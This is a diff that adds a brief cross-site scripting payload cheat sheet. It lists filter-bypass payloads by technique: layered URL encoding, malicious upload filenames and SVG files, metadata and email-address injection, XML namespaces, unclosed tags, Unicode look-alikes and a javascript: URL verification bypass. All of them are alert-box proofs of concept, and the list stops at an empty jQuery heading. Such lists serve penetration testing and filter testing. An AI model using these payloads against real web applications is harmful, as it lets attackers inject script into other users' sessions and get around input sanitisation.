@@ -1,0 +1,35 @@
+*Encoded
+(Encoded)
+%3Csvg%20onload%3Dalert(1)%3E
+
+(Double Encoded)
+%253Csvg%2520onload%253Dalert%281%29%253E
+
+(Triple Encoded)
+%25253Csvg%252520onload%25253Dalert%25281%2529%25253E
+
+*File Upoads
+"><svg onload=alert(1)>.jpeg
+
+*Metadata XSS
+'"><script>alert(1)</script>'
+
+*XSS with SVG file Upload
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
+
+*XSS via XML
+<a:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</a:script>
+
+*Email
+<svg/onload=alert(1)>"@gmail.com
+
+*Unclosed Tags
+<svg onload="alert(1)"
+
+* Unicode Encoding:
+†‡•＜img src=a onerror=javascript:alert('test')>…‰€
+
+* URL verification bypass
+javas&#x09;cript://www.google.com/%0Aalert(1)
+
+* jQuery < 3.0.0 XSS
